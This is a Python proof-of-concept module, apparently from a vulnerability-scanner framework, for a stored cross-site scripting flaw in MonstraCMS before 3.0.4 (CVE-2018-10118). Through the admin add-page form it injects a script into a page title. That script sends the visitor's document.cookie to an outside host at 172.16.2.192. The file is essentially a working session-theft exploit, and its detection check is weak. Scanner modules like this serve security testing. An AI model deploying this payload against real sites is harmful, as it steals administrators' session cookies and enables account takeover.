# coding:utf-8
import re

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MonstraCMS_0101'  # 平台漏洞编号
    name = 'MonstraCMS <3.0.4 - 跨站脚本'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-06-07'  # 漏洞公布时间
    desc = '''
    MonstraCMS <3.0.4 - 跨站脚本。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/44855/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = ' CVE-2018-10118'  # cve编号
    product = 'MonstraCMS'  # 漏洞组件名称
    product_version = '<3.0.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5cba17a2-2c3a-4421-a5b4-d092bfcf4175'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def runXSS(self, target, cookie, data):
        exploit = requests.post(target, cookies=cookie, data=data).text
        if re.search('exploit', exploit):
            return 'OK'
        else:
            return 'ERROR'

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            url = self.target
            PHPSESSID = ''
            pagename = ''
            script = '<script>window.open("http://172.16.2.192/xss_hacker.php?cookie="+document.cookie);</script><!--" />'
            target = url + '/admin/index.php?id=pages&action=add_page'
            cookie = {'PHPSESSID': PHPSESSID}
            data = {'csrf': '9c1763649f4e5ce611d29ef5cd10914fa61e91f5',
                    'page_title': script,
                    'page_name': pagename,
                    'page_meta_title': '',
                    'page_keywords': '',
                    'page_description': '',
                    'pages': 0,
                    'templates': 'index',
                    'status': 'published',
                    'access': 'public',
                    'editor': '',
                    'page_tags': '',
                    'add_page_and_exit': 'Save+and+Exit',
                    'page_date': '9999-99-99'}

            result = self.runXSS(target, cookie, data)
            if result == 'OK':
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
